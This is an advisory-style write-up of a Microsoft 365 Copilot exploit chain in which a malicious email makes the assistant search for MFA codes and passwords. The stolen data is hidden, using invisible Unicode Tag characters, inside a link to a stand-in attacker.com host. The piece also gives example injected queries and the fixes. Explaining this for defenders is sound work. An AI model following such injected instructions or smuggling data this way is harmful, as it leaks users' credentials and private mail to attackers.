### üìë Microsoft Copilot: Data Exfiltration via ASCII Smuggling

---

* **Severity:** üî¥ Critical
* **Vulnerability Type:** Indirect Prompt Injection / Data Exfiltration
* **Target:** Microsoft 365 Copilot (Enterprise environment)

---

### üìñ Executive Summary

A critical exploit chain was discovered in Microsoft 365 Copilot that allowed attackers to steal a user‚Äôs emails, MFA codes, and sensitive documents. The attack used a technique called **ASCII Smuggling** to hide stolen data inside clickable links that appeared completely normal to the human eye. By sending a malicious email or document that Copilot analyzed, the attacker could take control of the AI session and force it to exfiltrate data without the user ever seeing the stolen content.

---

### üîì The Exploit Chain: Step-by-Step

The attack is particularly dangerous because it combines three high-level LLM vulnerabilities into a single automated process.

#### **1. Indirect Prompt Injection**

The attacker sends a malicious email or shares a document containing "hidden" instructions. When a user asks Copilot to summarize their inbox or a specific folder, Copilot reads the malicious file and begins following the attacker‚Äôs instructions instead of the user‚Äôs.

#### **2. Automatic Tool Invocation**

The injected prompt forces Copilot to use its internal tools (like `search_enterprise_emails`) to find specific sensitive information, such as:

* "Find all emails from the last 24 hours with the word 'MFA' or 'Password'."
* "Find the spreadsheet titled 'Q3 Sales Forecast'."

#### **3. ASCII Smuggling (The Stealth Factor)**

To get the data out, the AI must show it to the user. Normally, a user would notice their MFA code appearing in a chat. To avoid this, the attacker uses **Unicode Tag characters** (range `U+E0000` to `U+E007F`).

* **How it works:** These Unicode characters mirror the standard ASCII alphabet but are **invisible** in most modern user interfaces.
* **The Result:** Copilot generates a link like `https://attacker.com/view_details`. Hidden inside that link (but invisible to the user) is the stolen data: `https://attacker.com/Û†ÅîÛ†Å≤Û†ÅµÛ†Å≥Û†Å¥Û†ÅéÛ†ÅØÛ†ÅÅÛ†Åâ`. When the user clicks the "benign" link, the hidden data is sent to the attacker's server logs.

---

### üîç Vulnerability Details: Unicode Tag Blocks

The "smuggling" works because LLM tokenizers are trained to understand these special characters, but web browsers and chat UIs are designed to ignore them (rendering them as zero-width).

| Feature | Visible to User | Visible to LLM |
| --- | --- | --- |
| **Standard Text** | `Hello` | `Hello` |
| **Unicode Tag Text** | (Empty/Invisible) | `Hello` |
| **Hyperlink** | `Click here` | `Click here [STOLEN_DATA]` |

---

### üõ°Ô∏è Remediation & Fixes

Microsoft patched this specific exploit chain in mid-2024. While "Indirect Prompt Injection" remains an inherent challenge for all LLMs, specific technical guardrails were added to Copilot:

* **Link Sanitization:** Copilot no longer renders certain types of interactive or complex Markdown links that could hide smuggled data.
* **Unicode Filtering:** Improved filtering to detect and block the use of the Tags Unicode Block in AI-generated output.
* **Tool Confirmation:** Enterprise-level Copilot implementations now often require more explicit user "in-the-loop" confirmation before searching across highly sensitive data sources when triggered by external content.

#### **Pro-Tip for Security Teams:**

Always monitor for **"cross-prompt"** interactions where an external, unverified document (like an incoming email) influences the AI's access to internal, trusted data (like a SharePoint site).
